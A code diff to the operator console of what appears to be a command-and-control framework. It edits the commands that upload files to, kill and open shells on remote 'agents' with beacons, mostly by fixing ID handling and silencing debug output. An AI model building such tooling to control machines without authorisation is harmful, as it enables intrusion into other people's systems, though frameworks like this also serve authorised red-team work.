@@ -61,12 +61,10 @@ class Interpreter(threading.Thread):
                 try:
                     local_filename = str(cmd.split()[1])
                     remote_filename = str(cmd.split()[2])
-                    arg_id = int(cmd.split()[3])
-                    print("LF: "+local_filename)
-                    print("RF: "+remote_filename)
-                    print("ID: "+str(arg_id))
-
-
+                    arg_id = cmd.split()[3]
+                    # print("LF: "+local_filename)
+                    # print("RF: "+remote_filename)
+                    # print("ID: "+str(arg_id))
                 except Exception as ex:
                     print(f"[* Interpreter-Msg:Upload] Unable to process filename or agent-id entered...")
                     self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Unable to process filename/agent-id for upload procedure')            
@@ -75,13 +73,13 @@ class Interpreter(threading.Thread):
                 else:
                     agentFound = False
                     for agent in self.agentList:
-                        print("Loop-AgentID: "+str(agent.getID()))
+                        # print("Loop-AgentID: "+str(agent.getID()))
                         if agent.getID() == arg_id:
                             agentFound = True
                             upload_agent = agent
                             self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Agent '+str(arg_id)+' exists')
                     
-                    print("AF: "+str(agentFound))
+                    # print("AF: "+str(agentFound))
                     if agentFound:
                         # for agent in self.agentList:
                         #     if agent.getID() == bot_id:
@@ -103,7 +101,7 @@ class Interpreter(threading.Thread):
             # TODO: Add a self-destruction function to the agent code
             elif (cmd.startswith("kill")):
                 try:
-                    arg_id = int(cmd.split()[1])
+                    arg_id = cmd.split()[1]
                 except Exception as ex:
                     print(f"[* Interpreter-Msg:Kill] Unable to process Agent ID entered...")
                     self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Unable to process Agent ID for kill')            
@@ -170,14 +168,19 @@ class Interpreter(threading.Thread):
                 else:
                     # Check if exists
                     agentFound = False
+                    # shell_agent = ''
+                    # shell_success = ''
                     for agent in self.agentList:
-                        if agent.getID == arg_id:
+                        if agent.getID() == arg_id:
                             agentFound = True
+                            shell_agent = agent
                             self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Shell] Agent '+str(arg_id)+' exists')
 
                     if agentFound:
                         try:
-                            self.interact(arg_id)
+                            agent.stopBeacon()
+                            # shell_success = self.shell(arg_id)
+                            agent.startBeacon()
                         except Exception as ex: 
                             print(f"[* Interpreter-Msg:Shell] Unable to initiate interaction with agent {arg_id}...")
                             self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Shell] Unable to initiate interaction with agent '+str(arg_id))            
@@ -298,8 +301,8 @@ class Interpreter(threading.Thread):
 
                 elif (batch_cmd.startswith("upload")):
                     try:
-                        local_filename = str(single_cmd.split()[1])
-                        remote_filename = str(single_cmd.split()[2])
+                        local_filename = str(batch_cmd.split()[1])
+                        remote_filename = str(batch_cmd.split()[2])
                     except Exception as ex:
                         print(f"[* Interpreter-Msg:SingleMode] Unable to process filename entered...")
                         self.loggers[0].q_log('serv','error','[* Interpreter-Msg:SingleMode] Unable to process filename for upload procedure')            
